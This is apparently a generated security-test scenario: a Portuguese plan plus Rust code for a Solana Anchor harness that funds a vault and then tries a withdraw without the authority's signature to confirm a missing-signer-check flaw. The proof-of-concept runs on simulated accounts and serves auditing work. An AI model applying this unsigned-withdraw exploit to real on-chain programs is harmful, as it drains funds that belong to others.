{
  "plan": "O cenário inicializa um vault PDA com autoridade legítima e deposita fundos via baseline (initialize + deposit). Em seguida, tenta executar withdraw sem a assinatura da autoridade, mantendo o mesmo vault e recipient, para testar a hipótese de Missing Signer Check. O efeito medido é a redução do saldo do vault e o aumento do saldo do recipient sem a assinatura da autoridade, o que não ocorreria no uso legítimo.",
  "scenario": "let authority = Pubkey::new_unique();
let recipient = Pubkey::new_unique();
let (vault_pda, _bump) = Pubkey::find_program_address(&[b"vault", authority.as_ref()], &env.program_id);

// Contas iniciais
let authority_account = wallet(10_000_000_000);
let recipient_account = wallet(1_000_000_000);
let vault_account = empty_account();
let system_program = system_program_account();

// Baseline: initialize
let ix_init = env.anchor_ix("initialize", &(), &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(system_program.0, false),
]);
let accounts_init = vec![
    (vault_pda, vault_account.clone()),
    (authority, authority_account.clone()),
    system_program.clone(),
];
let r_init = env.baseline("initialize vault", &ix_init, &accounts_init);

// Extrair vault após initialize
let vault_after_init = after(&r_init, &vault_pda).clone();

// Baseline: deposit
let ix_deposit = env.anchor_ix("deposit", &(1_000_000_000u64,), &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(system_program.0, false),
]);
let accounts_deposit = vec![
    (vault_pda, vault_after_init.clone()),
    (authority, authority_account.clone()),
    system_program.clone(),
];
let r_deposit = env.baseline("deposit 1 SOL", &ix_deposit, &accounts_deposit);

// Estado após deposit
let vault_after_deposit = after(&r_deposit, &vault_pda).clone();
let authority_after_deposit = after(&r_deposit, &authority).clone();
let recipient_after_deposit = recipient_account.clone();

// Ataque: withdraw sem assinatura da autoridade
let ix_attack = env.anchor_ix("withdraw", &(500_000_000u64,), &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new_readonly(authority, false), // NÃO assina
    AccountMeta::new(recipient, false),
]);
let accounts_attack = vec![
    (vault_pda, vault_after_deposit.clone()),
    (authority, authority_after_deposit.clone()),
    (recipient, recipient_after_deposit.clone()),
];
let r_attack = env.attack("withdraw sem assinatura da autoridade", &ix_attack, &accounts_attack);

if r_attack.program_result == ProgramResult::Success {
    let vault_after_attack = after(&r_attack, &vault_pda);
    let recipient_after_attack = after(&r_attack, &recipient);
    let vault_balance_before = read_u64(vault_after_deposit.data(), 40);
    let vault_balance_after = read_u64(vault_after_attack.data(), 40);
    let recipient_lamports_before = recipient_after_deposit.lamports();
    let recipient_lamports_after = recipient_after_attack.lamports();
    env.effect("saldo do vault reduzido sem assinatura da autoridade", vault_balance_after == vault_balance_before - 500_000_000);
    env.effect("lamports do recipient aumentados sem assinatura da autoridade", recipient_lamports_after == recipient_lamports_before + 500_000_000);
}"
}

